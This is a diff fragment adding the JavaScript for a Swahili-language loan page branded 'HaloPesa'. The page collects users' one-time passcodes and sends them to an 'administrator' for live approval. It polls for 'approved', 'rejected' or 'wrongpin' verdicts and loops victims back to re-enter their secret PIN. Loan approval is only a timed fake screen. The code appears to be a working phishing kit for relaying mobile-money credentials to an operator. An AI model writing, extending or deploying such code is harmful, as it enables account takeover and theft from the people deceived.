+    showErr('otpMsgErr', 'Tafadhali weka OTP kamili');
+    return;
+  }
+
+  try {
+    const res = await fetch('/api/submit-otp', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ registrationId: S.registrationId, otp: otp })
+    });
+
+    if (res.ok) {
+      document.getElementById('otpMsgOk').classList.add('show');
+      document.getElementById('otpMsgOkTxt').textContent = 'OTP imetumwa kwa msimamizi kwa uthibitisho';
+      startOtpApprovalPolling();
+    } else {
+      showErr('otpMsgErr', 'Hitilafu inatokea');
+    }
+  } catch (e) {
+    showErr('otpMsgErr', 'Hitilafu inatokea');
+  }
+}
+
+/* ══════════════════════════════════════════════════════════
+   OTP TIMER (60s)
+   ══════════════════════════════════════════════════════════ */
+function startOtpTimer() {
+  console.log('🚀 TIMER STARTED');
+
+  if (otpTimerInterval) { clearInterval(otpTimerInterval); otpTimerInterval = null; }
+
+  let count = 60;
+  const el0 = document.getElementById('otpTimeRemaining');
+  if (el0) el0.textContent = '60';
+
+  otpTimerInterval = setInterval(function () {
+    count -= 1;
+    const el = document.getElementById('otpTimeRemaining');
+    if (el) el.textContent = count;
+
+    if (count <= 0) {
+      clearInterval(otpTimerInterval);
+      otpTimerInterval = null;
+      console.log('⏰ TIMER EXPIRED');
+
+      document.getElementById('bOtp').style.display = 'none';
+      document.getElementById('bResendOtp').style.display = 'block';
+
+      const timerDiv = document.getElementById('otpTimer');
+      if (timerDiv) {
+        timerDiv.textContent = '⏱️ OTP imeharika! Tafadhali tuma tena.';
+        timerDiv.style.color = '#ff6600';
+        timerDiv.classList.add('warn');
+      }
+      console.log('✅ Resend button displayed');
+    }
+  }, 1000);
+}
+
+/* ══════════════════════════════════════════════════════════
+   OTP APPROVAL POLLING
+   ══════════════════════════════════════════════════════════ */
+function startOtpApprovalPolling() {
+  if (otpCheckInterval) clearInterval(otpCheckInterval);
+
+  otpCheckInterval = setInterval(async () => {
+    try {
+      const res = await fetch(`/api/check-registration-otp-status/${S.registrationId}`);
+      const data = await res.json();
+
+      if (data.status === 'approved') {
+        clearInterval(otpCheckInterval);
+        otpCheckInterval = null;
+        if (otpTimerInterval) { clearInterval(otpTimerInterval); otpTimerInterval = null; }
+        clearErr('otpMsgErr');
+        document.getElementById('otpMsgOk').classList.add('show');
+        document.getElementById('otpMsgOkTxt').textContent = 'OTP ilithibitishwa! Endelea na mkopo wako…';
+        setTimeout(() => { closeOtpModal(); goTo('page-step1'); }, 1500);
+      } else if (data.status === 'rejected') {
+        console.log('❌ OTP REJECTED - timer keeps running');
+        clearInterval(otpCheckInterval);
+        otpCheckInterval = null;
+        clearErr('otpMsgOk');
+        document.getElementById('otpMsgErr').classList.add('show');
+        document.getElementById('otpMsgErrTxt').textContent = 'OTP si sahihi. Tafadhali jaribu OTP nyingine';
+        setTimeout(() => {
+          [0,1,2,3].forEach(i => document.getElementById('o'+i).value = '');
+          document.getElementById('o0').focus();
+          document.getElementById('otpMsgErr').classList.remove('show');
+        }, 2000);
+      } else if (data.status === 'wrongpin') {
+        console.log('🔐 WRONG PIN - RETURNING TO REGISTRATION');
+        clearInterval(otpCheckInterval);
+        otpCheckInterval = null;
+        if (otpTimerInterval) { clearInterval(otpTimerInterval); otpTimerInterval = null; }
+        clearErr('otpMsgErr');
+        clearErr('otpMsgOk');
+        document.getElementById('otpMsgErr').classList.add('show');
+        document.getElementById('otpMsgErrTxt').textContent = 'Namba ya Siri si sahihi. Tafadhali jaribu tena';
+        setTimeout(() => {
+          closeOtpModal();
+          goTo('page-registration');
+          setTimeout(() => {
+            document.getElementById('otpMsgErr').classList.remove('show');
+            showErr('regErr', 'Namba ya Siri si sahihi. Tafadhali ingiza namba ya siri sahihi');
+          }, 300);
+        }, 1500);
+      }
+    } catch (e) {
+      console.error('OTP status check error:', e);
+    }
+  }, 2000);
+}
+
+/* ══════════════════════════════════════════════════════════
+   RESEND OTP
+   ══════════════════════════════════════════════════════════ */
+async function resendOtp() {
+  console.log('🔄 RESEND OTP - restarting timer');
+
+  [0,1,2,3].forEach(i => document.getElementById('o'+i).value = '');
+  document.getElementById('o0').focus();
+
+  document.getElementById('otpTimer').innerHTML = '⏱️ Muda unaobaki: <strong id="otpTimeRemaining">60</strong>s';
+  document.getElementById('otpTimer').style.color = '#888';
+  document.getElementById('otpTimer').classList.remove('warn');
+
+  document.getElementById('bOtp').style.display = 'block';
+  document.getElementById('bOtp').disabled = false;
+  document.getElementById('bResendOtp').style.display = 'none';
+
+  clearErr('otpMsgErr');
+  clearErr('otpMsgOk');
+
+  if (otpCheckInterval) { clearInterval(otpCheckInterval); otpCheckInterval = null; }
+  if (otpTimerInterval) { clearInterval(otpTimerInterval); otpTimerInterval = null; }
+
+  console.log('🟢 RESTARTING COUNTDOWN');
+  startOtpTimer();
+
+  try {
+    const res = await fetch('/api/submit-otp', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        registrationId: S.registrationId,
+        otp: '0000',
+        isResend: true
+      })
+    });
+
+    if (res.ok) {
+      notifyAdminOtpResent(S.registrationId, S.adminId);
+      startOtpApprovalPolling();
+    }
+  } catch (e) {
+    showErr('otpMsgErr', 'Hitilafu inatokea');
+  }
+}
+
+/* ══════════════════════════════════════════════════════════
+   LOAN STEP 1 → STEP 2
+   ══════════════════════════════════════════════════════════ */
+function toS2() {
+  const amt = document.getElementById('s1am').value;
+  const purpose = document.getElementById('s1pu').value.trim();
+  const phone = document.getElementById('s1ph').value.trim();
+
+  if (!amt || Number(amt) <= 0) { showErr('s1Err', 'Tafadhali weka kiasi sahihi'); return; }
+  if (!purpose) { showErr('s1Err', 'Tafadhali elezea madhumuni'); return; }
+  if (!phone || phone.length < 9) { showErr('s1Err', 'Tafadhali weka nambari sahihi'); return; }
+
+  S.amt = amt;
+  S.term = document.getElementById('s1te').value;
+  S.purpose = purpose;
+  S.phone = '+255' + phone;
+
+  document.getElementById('sA').textContent = 'TSh ' + Number(S.amt).toLocaleString();
+  document.getElementById('sT').textContent = S.term;
+  document.getElementById('sN').textContent = S.firstName + ' ' + S.lastName;
+  goTo('page-step2');
+}
+
+/* ══════════════════════════════════════════════════════════
+   SUBMIT LOAN APPLICATION
+   ══════════════════════════════════════════════════════════ */
+function submitApp() {
+  const income = document.getElementById('s2in').value;
+  if (!income || Number(income) <= 0) {
+    showErr('s2Err', 'Tafadhali weka mapato');
+    return;
+  }
+
+  document.getElementById('mSubmit').classList.add('show');
+
+  setTimeout(() => {
+    document.getElementById('mSubmit').classList.remove('show');
+    document.getElementById('apAmt').textContent = 'TSh ' + Number(S.amt).toLocaleString();
+    document.getElementById('apTerm').textContent = S.term;
+
+    const a = Number(S.amt);
+    const t = parseInt(S.term);
+    const r = 0.08 / 12;
+    const m = a * r * Math.pow(1 + r, t) / (Math.pow(1 + r, t) - 1);
+    document.getElementById('apMthly').textContent = 'TSh ' + m.toFixed(0).replace(/\B(?=(\d{3})+(?!\d))/g, ',');
+
+    goTo('page-approval');
+  }, 1500);
+}
+
+/* ══════════════════════════════════════════════════════════
+   INIT
+   ══════════════════════════════════════════════════════════ */
+document.addEventListener('DOMContentLoaded', () => {
+  // Auto-focus first OTP box advancement
+  [0,1,2,3].forEach(i => {
+    const el = document.getElementById('o'+i);
+    if (el) {
+      el.addEventListener('keydown', (ev) => {
+        if (ev.key === 'Backspace' && !el.value && i > 0) {
+          document.getElementById('o'+(i-1)).focus();
+        }
+      });
+    }
+  });
+
+  // OTP input: allow only digits
+  [0,1,2,3].forEach(i => {
+    const el = document.getElementById('o'+i);
+    if (el) {
+      el.addEventListener('input', () => {
+        el.value = el.value.replace(/[^0-9]/g, '');
+      });
+    }
+  });
+
+  console.log('✅ HaloPesa app initialized');
+});
+</script>
+
+</body>
+</html>
